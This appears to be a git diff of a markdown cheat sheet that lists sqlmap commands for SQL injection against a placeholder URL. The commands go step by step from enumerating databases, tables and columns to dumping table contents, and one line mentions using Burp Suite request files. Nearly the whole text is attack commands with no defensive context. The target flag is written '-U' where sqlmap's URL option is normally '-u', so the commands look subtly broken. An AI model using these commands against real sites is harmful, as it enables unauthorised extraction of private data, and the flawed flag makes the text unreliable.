@@ -2,13 +2,21 @@
 
 ## Commands:
 
-### Database enumeration: sqlmap -U "http://www.example.com/page.php?id=1" --dbs 
+### Database enumeration: 
 
-### Database Table enumeration: sqlmap -U "http://www.example.com/page.php?id=1" --tables -D DATABASE
+    sqlmap -U "http://www.example.com/page.php?id=1" --dbs 
 
-### Table columns enumeration:  sqlmap -U "http://www.example.com/page.php?id=1" --columns -D DATABASE -T TABLE
+### Database Table enumeration: 
 
-### Table information dumping: sqlmap -U "http://www.example.com/page.php?id=1" --dump -D DATABASE -T TABLE
+    sqlmap -U "http://www.example.com/page.php?id=1" --tables -D DATABASE
+
+### Table columns enumeration:  
+
+    sqlmap -U "http://www.example.com/page.php?id=1" --columns -D DATABASE -T TABLE
+
+### Table information dumping: 
+
+    sqlmap -U "http://www.example.com/page.php?id=1" --dump -D DATABASE -T TABLE
 
 #### -r HTTP_REQUEST_FILE = Use file from web proxies (Burpsuite) instead of writing entire URL
 
